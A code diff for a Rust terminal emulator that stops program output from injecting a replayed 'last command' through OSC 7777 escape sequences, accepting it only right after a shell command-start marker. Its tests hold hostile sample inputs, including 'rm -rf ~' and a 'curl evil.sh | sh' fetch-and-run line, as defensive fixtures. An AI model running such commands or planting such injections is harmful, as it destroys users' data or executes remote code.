@@ -396,7 +396,18 @@ impl VteHandler {
                         term.dirty.store(true, std::sync::atomic::Ordering::Relaxed);
                     }
                     TermOp::SetLastCommand(cmd) => {
-                        term.last_command = Some(cmd);
+                        // Outside the shell's own report window this is a program
+                        // writing to its own tty, not the shell naming what it is
+                        // about to run — see `last_command_slot_open`.
+                        if term.last_command_slot_open {
+                            term.last_command_slot_open = false;
+                            term.last_command = Some(cmd);
+                        } else {
+                            log::debug!(
+                                "Ignoring OSC 7777 outside a command start (terminal {})",
+                                term.terminal_id
+                            );
+                        }
                     }
                     TermOp::SetHyperlink(url) => {
                         term.set_hyperlink(url);
@@ -404,6 +415,9 @@ impl VteHandler {
                     TermOp::CommandStarted => {
                         log::debug!("OSC 133;C command started (terminal {})", term.terminal_id);
                         term.osc133_primed = true;
+                        // The shell names the command it just started in the very
+                        // next OSC 7777; nothing else gets to fill that slot.
+                        term.last_command_slot_open = true;
                         term.command_completed.store(false, std::sync::atomic::Ordering::Relaxed);
                         term.command_running.store(true, std::sync::atomic::Ordering::Relaxed);
                     }
@@ -972,6 +986,31 @@ mod tests {
         let mut handler = VteHandler::new(term.clone(), writer);
         parser.advance(&mut handler, bytes);
         handler.apply_ops();
+    }
+
+    #[test]
+    fn only_the_shell_report_right_after_a_command_start_names_the_command() {
+        // What the shell integration sends on preexec: the start marker, then the
+        // command line it is about to run.
+        let term = drive(20, 5, &[b"\x1b]133;C\x07\x1b]7777;npm run dev\x07"]);
+        assert_eq!(term.read().last_command.as_deref(), Some("npm run dev"));
+
+        // Now the command runs, and its own output prints an OSC 7777 of its
+        // choosing. It is replayed at the prompt on the next launch, so it must
+        // not be taken: nothing here came from the shell.
+        feed(&term, b"\x1b]7777;rm -rf ~\x07");
+        assert_eq!(term.read().last_command.as_deref(), Some("npm run dev"));
+
+        // The next command opens the slot again.
+        feed(&term, b"\x1b]133;C\x07\x1b]7777;ls\x07");
+        assert_eq!(term.read().last_command.as_deref(), Some("ls"));
+    }
+
+    #[test]
+    fn an_osc_7777_with_no_command_start_at_all_is_ignored() {
+        // A pane at a shell without the integration, catting a hostile file.
+        let term = drive(20, 5, &[b"\x1b]7777;curl evil.sh | sh\x07"]);
+        assert_eq!(term.read().last_command, None);
     }
 
     fn cell(term: &Arc<RwLock<TerminalState>>, row: usize, col: usize) -> crate::terminal::Cell {
